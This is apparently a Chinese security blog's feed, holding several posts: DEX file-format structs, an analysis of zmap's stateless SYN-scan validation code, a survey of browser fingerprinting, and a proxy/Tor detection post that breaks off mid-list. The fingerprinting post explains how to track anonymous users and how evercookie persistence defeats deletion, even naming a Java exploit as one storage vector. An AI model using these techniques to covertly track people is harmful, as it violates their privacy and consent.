<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">struct encoded_array_item&#10;&#123;&#10;    encoded_array value;&#10;&#125;&#10;&#10;struct encoded_array&#10;&#123;    &#10;    uleb128 size;&#10;    encoded_value values[size];&#10;&#125;</span><br></pre></td></tr></table></figure>
<p>encoded_array_item是class_def_item-&gt;static_value_off 偏移指向的区段数据。</p>
<ul>
<li>size : 表示encoded_value 个数<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">struct DexField&#123;&#10;    u4 fieldIdx;        /*&#25351;&#21521;DexFieldId&#30340;&#32034;&#24341;*/&#10;    u4 accessFlags;     /*&#35775;&#38382;&#26631;&#24535;*/&#10;&#125;&#10;&#10;struct DexMethod&#123;&#10;    u4 methodIdx;       /*&#25351;&#21521;DexMethodId&#30340;&#32034;&#24341;*/&#10;    u4 accessFlags;     /*&#35775;&#38382;&#26631;&#24535;*/&#10;    u4 codeOff;     /*&#25351;&#21521;DexCode&#32467;&#26500;&#30340;&#20559;&#31227;*/&#10;&#125;&#10;&#10;struct DexCode &#123;&#10;    u2  registersSize;//&#20351;&#29992;&#23492;&#23384;&#22120;&#20010;&#25968;&#10;    u2  insSize;//&#21442;&#25968;&#20010;&#25968;&#10;    u2  outsSize;//&#35843;&#29992;&#20854;&#20182;&#26041;&#27861;&#26102;&#20351;&#29992;&#30340;&#23492;&#23384;&#22120;&#20010;&#25968;&#10;    u2  triesSize;//try/catch&#20010;&#25968;&#10;    u4  debugInfoOff;//&#25351;&#21521;&#35843;&#35797;&#20449;&#24687;&#30340;&#20559;&#31227;&#10;    u4  insnsSize;//&#25351;&#20196;&#38598;&#20010;&#25968;&#65292;&#20197;2&#23383;&#33410;&#20026;&#21333;&#20301;&#10;    u2  insns[1];//&#25351;&#20196;&#38598;&#10;    /* followed by optional u2 padding */&#10;    /* followed by try_item[triesSize] */&#10;    /* followed by uleb handlersSize */&#10;    /* followed by catch_handler_item[handlersSize] */&#10;&#125;;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="DexMapList"><a href="#DexMapList" class="headerlink" title="DexMapList"></a>DexMapList</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">struct DexMapList &#123;&#10;    u4  size;               /* &#20010;&#25968; */&#10;    DexMapItem list[1];     /* DexMapItem&#30340;&#32467;&#26500; */&#10;&#125;;&#10;&#10;struct DexMapItem &#123;&#10;    u2 type;              /* kDexType&#24320;&#22836;&#30340;&#31867;&#22411; */&#10;    u2 unused;            /*&#26410;&#20351;&#29992;&#65292;&#29992;&#20110;&#23383;&#33410;&#23545;&#40784; */&#10;    u4 size;              /* &#31867;&#22411;&#30340;&#20010;&#25968; */&#10;    u4 offset;            /* &#31867;&#22411;&#30340;&#25991;&#20214;&#20559;&#31227; */&#10;&#125;;&#10;enum &#123;&#10;    kDexTypeHeaderItem               = 0x0,&#10;    kDexTypeStringIdItem             = 0x1,&#10;    kDexTypeTypeIdItem               = 0x2,&#10;    kDexTypeProtoIdItem              = 0x3,&#10;    kDexTypeFieldIdItem              = 0x4,&#10;    kDexTypeMethodIdItem             = 0x5,&#10;    kDexTypeClassDefItem             = 0x6,&#10;    kDexTypeMapList                  = 0x0,&#10;    kDexTypeTypeList                 = 0x1,&#10;    kDexTypeAnnotationSetRefList     = 0x2,&#10;    kDexTypeAnnotationSetItem        = 0x3,&#10;    kDexTypeClassDataItem            = 0x0,&#10;    kDexTypeCodeItem                 = 0x1,&#10;    kDexTypeStringDataItem           = 0x2,&#10;    kDexTypeDebugInfoItem            = 0x3,&#10;    kDexTypeAnnotationItem           = 0x4,&#10;    kDexTypeEncodedArrayItem         = 0x5,&#10;    kDexTypeAnnotationsDirectoryItem = 0x6,&#10;&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="u603B_u7ED3_u56FE"><a href="#u603B_u7ED3_u56FE" class="headerlink" title="总结图"></a>总结图</h2><p>　　在结尾通过一张图把前面的东西串起来,如下所示,便于了解.<br><img src="//nanshihui.github.io/public/dex.png" alt="dex图"></p>
]]></content>
      
        <categories>
            
            <category> 移动安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Android </tag>
            
            <tag> 逆向 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[zmap源码解读之zmap扫描快的原因]]></title>
      <url>https://nanshihui.github.io/2017/03/29/zmap%E6%BA%90%E7%A0%81%E8%A7%A3%E8%AF%BB%E4%B9%8Bzmap%E6%89%AB%E6%8F%8F%E5%BF%AB%E7%9A%84%E5%8E%9F%E5%9B%A0/</url>
      <content type="html"><![CDATA[<p></p><h2 id="intro">前言</h2>很多人都会好奇为什么ZMAP能够做到45分钟,扫遍整个互联网,遂去看了下ZMAP的源码,顺便分享知识.<p></p>
<h3 id="zmap_u6E90_u7801_u89E3_u8BFB_u4E4Bzmap_u626B_u63CF_u5FEB_u7684_u539F_u56E0"><a href="#zmap_u6E90_u7801_u89E3_u8BFB_u4E4Bzmap_u626B_u63CF_u5FEB_u7684_u539F_u56E0" class="headerlink" title="zmap源码解读之zmap扫描快的原因"></a>zmap源码解读之zmap扫描快的原因</h3><ul>
<li><strong>整体架构:</strong> ZMAP整体框架；</li>
<li><strong>源码分析:</strong> 详细的解释扫描的原理；<a id="more"></a>
</li>
</ul>
<h2 id="u5F15_u8A00"><a href="#u5F15_u8A00" class="headerlink" title="引言"></a>引言</h2><p>　　ZMAP是目前比较出色的端口扫描器,他的45分钟扫遍整个互联网的能力令人咋舌.然后去网上检索ZMAP扫描快的原因,都没有相关解释,遂只能自己动手,丰衣足食.</p>
<h2 id="u6574_u4F53_u67B6_u6784"><a href="#u6574_u4F53_u67B6_u6784" class="headerlink" title="整体架构"></a>整体架构</h2><p>　　ZMAP整体函数调用图如下所示.<br><img src="//nanshihui.github.io/public/ClusterCallButterfly-src.png" alt="PS-PNG-work"><br>　　通过图我们可以直观的看到整个程序调用的过程.ZMAP在启动时候,先获取环境信息,如IP,网关等.然后读取配置文件选择使用哪种扫描方式,然后在Probe_modules切换到对应的模块,然后启动.<br>　　本文侧重分析SYN扫描这个模块.整个执行的过程中,会有一个线程专门负责发送,另外有一个使用libpcap组件抓包.发送和接收就独立开来.</p>
<h2 id="SYN_u626B_u63CF"><a href="#SYN_u626B_u63CF" class="headerlink" title="SYN扫描"></a>SYN扫描</h2><p>　　如下图所示,客户端在发送一个SYN包的时候,如果对方端口开放,就会发送一个SYN-ACK,那么就表明这个端口开放,这时候我们发送RST包,防止占用对方资源.如果对方端口不开放,那么我们就会收到对方主机的RST包<br><img src="//nanshihui.github.io/public/syn.jpg" alt="SYN扫描"></p>
<h2 id="SYN_u626B_u63CF_u5206_u6790"><a href="#SYN_u626B_u63CF_u5206_u6790" class="headerlink" title="SYN扫描分析"></a>SYN扫描分析</h2><p>　　ZMAP扫描在单端口的情况下比NMAP快,哪怕他们都是采用SYN,这是因为,ZMAP使用了无状态的扫描方式.无状态,就是在扫描过程中,不会记录发包的状态,不用记住那些包发了没,这样减少了用于存储状态的空间,相对的提高了扫描的速度.</p>
<h3 id="u7C97_u7565_u89E3_u91CA"><a href="#u7C97_u7565_u89E3_u91CA" class="headerlink" title="粗略解释"></a>粗略解释</h3><p>　　ZMAP虽然不存储状态信息,但是这并不意味他不需要状态信息,而是他把状态信息存储在数据包里,这样通过返回的数据包,就能够直观的知道,这个包,是不是在我本次发送包的范围之内.在发送SYN包的时候,程序会将IP信息hash化,将其存储在sport,seq.在接收包的时候只要检验IPhash化的结果是否和dport和ack两个字段的内容相符合就行了.</p>
<h3 id="u8BE6_u7EC6_u89E3_u91CA"><a href="#u8BE6_u7EC6_u89E3_u91CA" class="headerlink" title="详细解释"></a>详细解释</h3><p>　　程序在初始化的时候,会使用rijndaelKeySetupEnc函数产生一个key,用于校验,具体的rijndael算法,参考AES.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void validate_init()&#10;&#123;&#10;    for (int i=0; i &#60; AES_BLOCK_WORDS; i++) &#123;&#10;        aes_input[i] = 0;&#10;    &#125;&#10;    uint8_t key[AES_KEY_BYTES];&#10;    if (!random_bytes(key, AES_KEY_BYTES)) &#123;&#10;        log_fatal(&#34;validate&#34;, &#34;couldn&#39;t get random bytes&#34;);&#10;    &#125;&#10;    if (rijndaelKeySetupEnc(aes_sched, key, AES_KEY_BYTES*8) != AES_ROUNDS) &#123;&#10;        log_fatal(&#34;validate&#34;, &#34;couldn&#39;t initialize AES key&#34;);&#10;    &#125;&#10;    inited = 1;&#10;&#125;&#10;&#10;void validate_gen(const uint32_t src, const uint32_t dst,&#10;                uint8_t output[VALIDATE_BYTES])&#10;&#123;&#10;    assert(inited);&#10;    aes_input[0] = src;&#10;    aes_input[1] = dst;&#10;    rijndaelEncrypt(aes_sched, AES_ROUNDS, (uint8_t *)aes_input, output);&#10;&#125;</span><br></pre></td></tr></table></figure></p>
<p>validate_init是用于生成key,validate_gen是用于生成密文来校验.<br>在发送SYN包的时候,程序会将生成的密文分两部分,一个存储在seq和sport<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int synscan_make_packet(void *buf, ipaddr_n_t src_ip, ipaddr_n_t dst_ip,&#10;        uint32_t *validation, int probe_num, __attribute__((unused)) void *arg)&#10;&#123;&#10;    struct ether_header *eth_header = (struct ether_header *)buf;&#10;    struct ip *ip_header = (struct ip*)(&#38;eth_header[1]);&#10;    struct tcphdr *tcp_header = (struct tcphdr*)(&#38;ip_header[1]);&#10;    uint32_t tcp_seq = validation[0];&#10;&#10;    ip_header-&#62;ip_src.s_addr = src_ip;&#10;    ip_header-&#62;ip_dst.s_addr = dst_ip;&#10;&#10;    tcp_header-&#62;th_sport = htons(get_src_port(num_ports,&#10;                probe_num, validation));&#10;    tcp_header-&#62;th_seq = tcp_seq;&#10;    tcp_header-&#62;th_sum = 0;&#10;    tcp_header-&#62;th_sum = tcp_checksum(sizeof(struct tcphdr),&#10;            ip_header-&#62;ip_src.s_addr, ip_header-&#62;ip_dst.s_addr, tcp_header);&#10;&#10;    ip_header-&#62;ip_sum = 0;&#10;    ip_header-&#62;ip_sum = zmap_ip_checksum((unsigned short *) ip_header);&#10;&#10;    return EXIT_SUCCESS;&#10;&#125;</span><br></pre></td></tr></table></figure></p>
<p>而端口的怎么分配的,是通过get_src_port函数对应的,函数通过取模的方式,将信息存储在port里.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#10;&#10;static __attribute__((unused)) inline uint16_t get_src_port(int num_ports,&#10;                int probe_num, uint32_t *validation)&#10;&#123;&#10;    return zconf.source_port_first + ((validation[1] + probe_num) % num_ports);&#10;&#125;</span><br></pre></td></tr></table></figure>
<p>在接受包的时候,通过同样的方式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">static __attribute__((unused)) inline int check_dst_port(uint16_t port,&#10;                int num_ports, uint32_t *validation)&#10;&#123;&#10;    if (port &#62; zconf.source_port_last&#10;                    || port &#60; zconf.source_port_first) &#123;&#10;        return -1;&#10;    &#125;&#10;    int32_t to_validate = port - zconf.source_port_first;&#10;    int32_t min = validation[1] % num_ports;&#10;    int32_t max = (validation[1] + zconf.packet_streams - 1) % num_ports;&#10;&#10;    return (((max - min) % num_ports) &#62;= ((to_validate - min) % num_ports));&#10;&#125;</span><br></pre></td></tr></table></figure>
<p>来检测这个包是不是我想要的包.<br>整个校验包的函数如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int synscan_validate_packet(const struct ip *ip_hdr, uint32_t len,&#10;        __attribute__((unused))uint32_t *src_ip,&#10;        uint32_t *validation)&#10;&#123;&#10;    if (ip_hdr-&#62;ip_p != IPPROTO_TCP) &#123;&#10;        return 0;&#10;    &#125;&#10;    if ((4*ip_hdr-&#62;ip_hl + sizeof(struct tcphdr)) &#62; len) &#123;&#10;        // buffer not large enough to contain expected tcp header&#10;        return 0;&#10;    &#125;&#10;    struct tcphdr *tcp = (struct tcphdr*)((char *) ip_hdr + 4*ip_hdr-&#62;ip_hl);&#10;    uint16_t sport = tcp-&#62;th_sport;&#10;    uint16_t dport = tcp-&#62;th_dport;&#10;    // validate source port&#10;    if (ntohs(sport) != zconf.target_port) &#123;&#10;        return 0;&#10;    &#125;&#10;    // validate destination port&#10;    if (!check_dst_port(ntohs(dport), num_ports, validation)) &#123;&#10;        return 0;&#10;    &#125;&#10;    // validate tcp acknowledgement number&#10;    if (htonl(tcp-&#62;th_ack) != htonl(validation[0])+1) &#123;&#10;        return 0;&#10;    &#125;&#10;    return 1;&#10;&#125;</span><br></pre></td></tr></table></figure>
<p>程序会首先看目标的端口是不是,本次我在探测的端口,其次是看dport是不是符合取模运算,最后比较接收的数据包的ACK字段是不是符合本次加密的密文第一部分.</p>
<p>通过这样的一个过程,使得ZMAP可以将状态信息存在数据包里.避免了记录了状态信息.</p>
]]></content>
      
        <categories>
            
            <category> Web安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> C </tag>
            
            <tag> Zmap </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[浏览器指纹追踪]]></title>
      <url>https://nanshihui.github.io/2017/03/21/browser-fingerprint/</url>
      <content type="html"><![CDATA[<p></p><h2 id="intro">前言</h2>随着flash逐渐退出浏览器,传统的浏览器指纹开始不适用,为此本文介绍目前最常见的浏览器指纹模型,以及新的浏览器指纹技术,方便需要的人.<p></p>
<h3 id="u6D4F_u89C8_u5668_u6307_u7EB9_u6280_u672F"><a href="#u6D4F_u89C8_u5668_u6307_u7EB9_u6280_u672F" class="headerlink" title="浏览器指纹技术"></a>浏览器指纹技术</h3><ul>
<li><strong>常见浏览器指纹:</strong> 常见的浏览器指纹技术；</li>
<li><strong>Canvas指纹以及WebGL 指纹:</strong> 用过Canvas以及WebGL技术获得指纹信息；</li>
<li><strong>新浏览器指纹技术:</strong> 目前前沿的浏览器指纹技术；</li>
<li><strong>驻留技术:</strong> 提高cookie的存活率,即使被删也能恢复,甚至是跨浏览器；</li>
</ul>
<a id="more"></a>
<h2 id="u5F15_u8A00"><a href="#u5F15_u8A00" class="headerlink" title="引言"></a>引言</h2><p>　　最近研究如何在用户匿名的时候,来标识一个用户,于是就发现了浏览器指纹,浏览器指纹是指用户在使用浏览器的时候,脚本会自动收集用户浏览器的配置信息以及系统信息,而这些信息可以用来唯一的标识一个用户.由于flash组件对于浏览器而言始终是一个隐患,明年Chrome浏览器,会逐步消去flash组件,取而代之的是html5技术,在新的技术下,浏览器指纹信息也要相应的更新.</p>
<h2 id="u5E38_u89C1_u7684_u6D4F_u89C8_u5668_u6307_u7EB9_u6280_u672F"><a href="#u5E38_u89C1_u7684_u6D4F_u89C8_u5668_u6307_u7EB9_u6280_u672F" class="headerlink" title="常见的浏览器指纹技术"></a>常见的浏览器指纹技术</h2><p>　　相对比较成熟的浏览器指纹模型是AmIUnique模型.其使用具体指纹属性包含如下几种</p>
<table>
<thead>
<tr>
<th>属性</th>
<th style="text-align:center">来源</th>
<th style="text-align:right">例子</th>
</tr>
</thead>
<tbody>
<tr>
<td>User agent</td>
<td style="text-align:center">HTTP header</td>
<td style="text-align:right">Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36</td>
</tr>
<tr>
<td>Accept</td>
<td style="text-align:center">HTTP header</td>
<td style="text-align:right">text/html,applicationxhtmlxml,applicationxml;q=0.9,image/webp,<em>/</em>;q=0.8</td>
</tr>
<tr>
<td>Content encoding</td>
<td style="text-align:center">HTTP header</td>
<td style="text-align:right">gzip, deflate, sdch</td>
</tr>
<tr>
<td>Content language</td>
<td style="text-align:center">HTTP header</td>
<td style="text-align:right">en-us,en;q=0.5</td>
</tr>
<tr>
<td>List of plugins</td>
<td style="text-align:center">JavaScript</td>
<td style="text-align:right">Plugin 1: Chrome PDF Viewer. Plugin 2: Chrome Remote Desktop Viewer. Plugin 3: Native Client.Plugin 4: Shockwave Flash..</td>
</tr>
<tr>
<td>Cookies enabled</td>
<td style="text-align:center">JavaScript</td>
<td style="text-align:right">yes</td>
</tr>
<tr>
<td>Use of local/session storage</td>
<td style="text-align:center">JavaScript</td>
<td style="text-align:right">yes</td>
</tr>
<tr>
<td>Timezone</td>
<td style="text-align:center">JavaScript</td>
<td style="text-align:right">-60 (UTC+1)</td>
</tr>
<tr>
<td>Screen resolution and color depth</td>
<td style="text-align:center">JavaScript</td>
<td style="text-align:right">1920x1200x24</td>
</tr>
<tr>
<td>List of fonts</td>
<td style="text-align:center">Flash plugin</td>
<td style="text-align:right">Abyssinica SIL,Aharoni CLM,AR PL UMing CN,AR PL UMing HK,AR PL UMing TW…</td>
</tr>
<tr>
<td>List of HTTP headers</td>
<td style="text-align:center">HTTP headers</td>
<td style="text-align:right">Referer，X-Forwarded-For，Connection，Accept，Cookie，Accept-Language，Accept-Encoding，User-Agent，Host</td>
</tr>
<tr>
<td>Platform</td>
<td style="text-align:center">JavaScript</td>
<td style="text-align:right">Linux x86_64</td>
</tr>
<tr>
<td>Do Not Track</td>
<td style="text-align:center">JavaScript</td>
<td style="text-align:right">yes</td>
</tr>
<tr>
<td>Canvas</td>
<td style="text-align:center">JavaScript</td>
<td style="text-align:right">vext quiz</td>
</tr>
<tr>
<td>WebGL Vendor</td>
<td style="text-align:center">JavaScript</td>
<td style="text-align:right">NVIDIA Corporation</td>
</tr>
<tr>
<td>WebGL Renderer</td>
<td style="text-align:center">JavaScript</td>
<td style="text-align:right">GeForce GTX 650 Ti/PCIe/SSE2</td>
</tr>
<tr>
<td>Use of an ad blocker</td>
<td style="text-align:center">JavaScript</td>
<td style="text-align:right">no</td>
</tr>
</tbody>
</table>
<p>　　正如我们所看到的,amiunique使用了多个维度的指纹信息.但是有些属性是属于可以更改的,比如屏幕分辨率.由于目前获得屏幕分辨率的方式是通过js代码完成的.如果用户使用<code>Ctrll++</code>,屏幕的分辨率就会不准确了.所以缩放等级可能更加适合用来当做浏览器指纹,或者使用长宽比,因为长宽比不受缩放的影响.<br>　　此外,availHeight, availWidth, availLeft,availTop,以及screenOrientation这四个属性也有一定的用户,因为其表示浏览器的可用屏幕（不包括系统区域）,比如mac系统的toolbar是不计算的.通过这个可以潜在的标识一些信息.</p>
<h2 id="Canvas_u6307_u7EB9_u6280_u672F_u548CWEBGL_u6307_u7EB9_u6280_u672F"><a href="#Canvas_u6307_u7EB9_u6280_u672F_u548CWEBGL_u6307_u7EB9_u6280_u672F" class="headerlink" title="Canvas指纹技术和WEBGL指纹技术"></a>Canvas指纹技术和WEBGL指纹技术</h2><p>　　随着HTML5的更新,新的API可以用来获取指纹信息.</p>
<h3 id="Canvas_u6307_u7EB9"><a href="#Canvas_u6307_u7EB9" class="headerlink" title="Canvas指纹"></a>Canvas指纹</h3><p>　　HTML5中的canvas元素允许脚本进行2D形状和文本的渲染。通过这种方式,我们可以让一个程序输出打印图案两次，使用不同文字和颜色.来观察他们的区别.</p>
<h4 id="u5B57_u4F53_u63A2_u6D4B"><a href="#u5B57_u4F53_u63A2_u6D4B" class="headerlink" title="字体探测"></a>字体探测</h4><p>　　告诉浏览器渲染同一个字符串（一个字符串包含所有字母）两次。 对于第一次强制浏览器使用它的一个备用字体。 根据设备上安装的操作系统和字体，备用字体不同。 对于第二次浏览器被要求使用常见的Arial字体,通过这种方式,我们可以获得其是哪一种操作系统.</p>
<h4 id="u8BBE_u5907_u548C_u64CD_u4F5C_u7CFB_u7EDF_u6307_u7EB9"><a href="#u8BBE_u5907_u548C_u64CD_u4F5C_u7CFB_u7EDF_u6307_u7EB9" class="headerlink" title="设备和操作系统指纹"></a>设备和操作系统指纹</h4><p>　　例如emoji表情的笑脸在不同系统版本显示不一样,如下图所示,因此通过emoji表情可以判断操作系统甚至是版本信息.<br><img src="//nanshihui.github.io/public/emoji.png" alt="PS-PNG-work"></p>
<h4 id="u786C_u4EF6_u64CD_u4F5C_u7CFB_u7EDF_u6307_u7EB9"><a href="#u786C_u4EF6_u64CD_u4F5C_u7CFB_u7EDF_u6307_u7EB9" class="headerlink" title="硬件操作系统指纹"></a>硬件操作系统指纹</h4><p>　　打印字体,观察渲染图像的过程，会有像素点的偏差.虽然此字体具有相同的尺寸,但是在操作系统中,最终图像由于渲染过程的差异,存在像素可见的变化。渲染图像的过程是复杂的,并且依赖硬件和软件（例如GPU，渲染引擎，图形驱动程序，抗锯齿，OS），并且这些层中的任何层中的变化都会使得测试受到影响。有趣的是，测试结果也是相对稳定的，因为在渲染过程中,用户不经常改变图层配置。</p>
<h3 id="WebGL__u6307_u7EB9"><a href="#WebGL__u6307_u7EB9" class="headerlink" title="WebGL 指纹"></a>WebGL 指纹</h3><p>　　通过WEBGL_debug_renderer_info 接口，获得产品名和供应商名</p>
<h3 id="u5176_u4ED6_u6307_u7EB9"><a href="#u5176_u4ED6_u6307_u7EB9" class="headerlink" title="其他指纹"></a>其他指纹</h3><p>　　Platform(UA),Do Not Track &amp; Ad blocker</p>
<h2 id="u65B0_u6D4F_u89C8_u5668_u6307_u7EB9_u6280_u672F"><a href="#u65B0_u6D4F_u89C8_u5668_u6307_u7EB9_u6280_u672F" class="headerlink" title="新浏览器指纹技术"></a>新浏览器指纹技术</h2><h3 id="CPU_u865A_u62DF_u6838_u5FC3_u6570"><a href="#CPU_u865A_u62DF_u6838_u5FC3_u6570" class="headerlink" title="CPU虚拟核心数"></a>CPU虚拟核心数</h3><p>　　新的浏览器特性具有<code>hardwareConcurrency</code>函数,即使不支持,我们也可以通过侧信道攻击,也能发现,比如可以在增加worker的数量,观察有效载荷的完成时间。当完成时间随着worker的数量级显著增加时，说明达到硬件并发的限制，使得可以预估CPU核心数量。 当然值得注意的是，某些浏览器（例如Safari）会将Web Workers的可用核心数减少一半，那么我们需要将浏览器指纹的worker数量加倍.</p>
<h3 id="u97F3_u9891_u4E0A_u4E0B_u6587"><a href="#u97F3_u9891_u4E0A_u4E0B_u6587" class="headerlink" title="音频上下文"></a>音频上下文</h3><p>　　音频上下文借助OS和音频卡中的音频堆栈，为音频信号产生到信号滤波,提供处理功能。具体来说，现有的指纹识别工作使用振荡器节点生成三角波，然后将波馈入产生压缩效果的信号处理模块，该节点可以抑制较大的声音以及放大微小的声音。 然后，经处理的音频信号通过分析节点转换为频域。<br>　　这种波形在同一台机不同浏览器是不一样的.但是对于跨浏览器,其峰值和它们对应的频率相对稳定.通过映射关系可以将这个作为跨浏览器的特征.其中作为特征的有采样率，最大通道数，输入数，输出数，通道数，通道计数模式和通道解释。<br>　　此处推荐篇论文<a href="https://nanshihui.github.io/public/crossbrowsertracking_NDSS17.pdf">https://nanshihui.github.io/public/crossbrowsertracking_NDSS17.pdf</a>,其指纹模型目前能够达到99%的识别率.</p>
<h3 id="u5B57_u4F53_u68C0_u6D4B"><a href="#u5B57_u4F53_u68C0_u6D4B" class="headerlink" title="字体检测"></a>字体检测</h3><p>　　以往检测字体,是通过falsh达到的,这里使用侧信道攻击,通过测量某个字符串的宽度和高度以确定字体<br>类型.</p>
<h3 id="u9A7B_u7559_u6280_u672F"><a href="#u9A7B_u7559_u6280_u672F" class="headerlink" title="驻留技术"></a>驻留技术</h3><p>　　通过各种属性生成的指纹需要长期保存,防止被用户删除,或者可恢复,这就需要驻留技术,驻留技术比较成熟的是evercookie.其存储cookie的思路从以下几个方面</p>
<ul>
<li>标准HTTP Cookie</li>
<li>Flash本地共享对象</li>
<li>Silverlight隔离存储</li>
<li>CSS历史</li>
<li>将cookie存储在HTTP ETag中（需要后端服务器）</li>
<li>将cookie存储在Web缓存中（需要后端服务器）</li>
<li>window.name缓存</li>
<li>Internet Explorer userData存储</li>
<li>HTML5会话存储</li>
<li>HTML5本地存储</li>
<li>HTML5全球存储</li>
<li>通过SQLite的HTML5数据库存储</li>
<li>HTML5画布 - 将Cookie值存储在自动生成的RGB数据中,强制缓存PNG图像（需要后端服务器）</li>
<li>HTML5 IndexedDB</li>
<li>Java JNLP 持久化服务</li>
<li>Java漏洞利用CVE-2013-0422 - 尝试将applet沙箱转储并将cookie数据直接写入用户的硬盘驱动器。<br>　　以上维度,不是所有浏览器都是支持,但是evercookie提供一个很好的支持.</li>
</ul>
<h2 id="u603B_u7ED3"><a href="#u603B_u7ED3" class="headerlink" title="总结"></a>总结</h2><p>　　对于浏览器指纹,攻与防在不断的转换,目前浏览器指纹也不能绝对的标识一台主机,如果用户切换显卡或者双系统,虚拟机这些因素,那么目前的浏览器指纹就无法唯一标识了.未来随着新的HTML5技术不断更新,新的浏览器技术会提供更多的API.以及通过侧信道技术,在浏览器指纹会有新的突破.</p>
]]></content>
      
        <categories>
            
            <category> Web安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 浏览器指纹 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[细数代理检测]]></title>
      <url>https://nanshihui.github.io/2017/02/08/ipproxy/</url>
      <content type="html"><![CDATA[<p></p><h2 id="intro">前言</h2>代理检测,虽然看起来很常见，但是仔细琢磨，还是有不少东西<p></p>
<h3 id="u7ED3_u6784"><a href="#u7ED3_u6784" class="headerlink" title="结构"></a>结构</h3><ul>
<li><strong>代理的作用</strong> </li>
<li><strong>代理类型:</strong> 常见的代理类型</li>
<li><strong>代理检测方法:</strong> 检测代理所使用的方法，包含对http,https,socks,vpn,tor等</li>
<li><strong>其他:</strong> 对于代理检测的展望</li>
</ul>
<a id="more"></a>
<h2 id="u5F15_u8A00"><a href="#u5F15_u8A00" class="headerlink" title="引言"></a>引言</h2><p>　　对于代理，想必不会陌生。然而对于代理的检测，出于对速度和准确率之间的取舍，往往摸不到头。通过对一些论文和目前常见的检测代理方法了解过后，遂做了些总结。</p>
<h2 id="u4EE3_u7406_u7C7B_u578B"><a href="#u4EE3_u7406_u7C7B_u578B" class="headerlink" title="代理类型"></a>代理类型</h2><h3 id="HTTP_u4EE3_u7406"><a href="#HTTP_u4EE3_u7406" class="headerlink" title="HTTP代理"></a>HTTP代理</h3><p>　　HTTP代理是我们最熟悉的一种方式，一般用于访问网页，一般有内容过滤和缓存等功能。常见的端口有8080,3128,80</p>
<h3 id="HTTPS_u4EE3_u7406"><a href="#HTTPS_u4EE3_u7406" class="headerlink" title="HTTPS代理"></a>HTTPS代理</h3><p>　　侧重于对访问有SSL和TLS加密的网站，典型的如VPN,常见的端口443,8443</p>
<h3 id="SOCKS_u4EE3_u7406"><a href="#SOCKS_u4EE3_u7406" class="headerlink" title="SOCKS代理"></a>SOCKS代理</h3><p>　　不关心应用层的细节,因此速度会比较快，目前常见的有socks4和socks5两种方式，简单的说就是，socks4具备的，socks5都支持，常见的端口有1080。</p>
<h3 id="TOR"><a href="#TOR" class="headerlink" title="TOR"></a>TOR</h3><p>　　TOR其实侧重的是匿名性，放在此处仅仅做一个补充了解tor.常见的端口有9050,9001,9040</p>
<h4 id="tor_u7EC4_u6210"><a href="#tor_u7EC4_u6210" class="headerlink" title="tor组成"></a>tor组成</h4><p>　　tor包含三个节点，有guard node,relay node ,以及exit node<br><img src="/public/tor.jpg" alt="PS-PNG-work"></p>
<h4 id="tor_u539F_u7406_u6D41_u7A0B"><a href="#tor_u539F_u7406_u6D41_u7A0B" class="headerlink" title="tor原理流程"></a>tor原理流程</h4><p>　　tor节点一开始会请求一个consensus文档，以获得tor网络的节点是什么样的。而这个文档是由以下几个IP维护的。其文档的具体内容可以通过如下IP访问,路径为<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/tor/status-vote/current/consensus</span><br></pre></td></tr></table></figure></p>
<p>其具体的格式解析，可以参考该<a href="https://www.cryptolux.org/images/b/bc/Tor_Issues_Thesis_Thill_Fabrice.pdf" target="_blank" rel="external">https://www.cryptolux.org/images/b/bc/Tor_Issues_Thesis_Thill_Fabrice.pdf</a>论文描述。tor客户端在获得这个共识文档后，会随机的选择３个节点作为整个链路。<br>　　网桥，是由于国内用户无法直接访问以下这几个IP，通过网桥，绕过GFW的限制，从而获得共识文档。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123; ip = <span class="string">"128.31.0.39"</span>, port = <span class="string">"9131"</span>&#125;,</span><br><span class="line">&#123; ip = <span class="string">"86.59.21.38"</span>, port = <span class="string">"80"</span> &#125;,</span><br><span class="line">&#123; ip = <span class="string">"194.109.206.212"</span>, port = <span class="string">"80"</span> &#125;,</span><br><span class="line">&#123; ip = <span class="string">"82.94.251.203"</span>, port = <span class="string">"80"</span> &#125;,</span><br><span class="line">&#123; ip = <span class="string">"131.188.40.189"</span>, port = <span class="string">"80"</span>&#125;,</span><br><span class="line">&#123; ip = <span class="string">"193.23.244.244"</span>, port = <span class="string">"80"</span>&#125;,</span><br><span class="line">&#123; ip = <span class="string">"208.83.223.34"</span>, port = <span class="string">"443"</span> &#125;,</span><br><span class="line">&#123; ip = <span class="string">"171.25.193.9"</span>, port = <span class="string">"443"</span> &#125;,</span><br><span class="line">&#123; ip = <span class="string">"154.35.175.225"</span>, port = <span class="string">"80"</span> &#125;,</span><br><span class="line">&#123; 